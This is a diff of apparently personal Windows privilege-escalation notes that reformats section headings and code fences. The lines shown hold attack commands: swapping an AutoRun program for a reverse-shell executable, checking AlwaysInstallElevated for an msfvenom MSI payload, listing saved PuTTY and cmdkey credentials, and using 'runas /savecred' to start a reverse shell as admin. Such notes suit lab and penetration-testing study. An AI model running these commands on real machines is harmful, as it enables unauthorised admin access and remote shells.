@@ -54,10 +54,13 @@ if you are able to write to an AutoRun executable, and are able to restart the s
  
  .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
  
- // exploit replace the exe with our reverse shell
+
+```
+ Exploit:
+ ```
  copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
  copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\AutorunProgram\program.exe"
-```
+ ```
 
 ### AlwaysInstallElevated
 
@@ -70,8 +73,7 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
-Exploitation
-
+Exploit:
 ```
 // Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:
 
@@ -99,7 +101,7 @@ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
 cmdkey /list
 
 ```
-Exploitation
+Exploit:
 ```
 //We can use the saved credential to run any command as the admin user. Start a listener on Kali and run the reverse shell executable:
 runas /savecred /user:admin C:\PrivEsc\reverse.exe
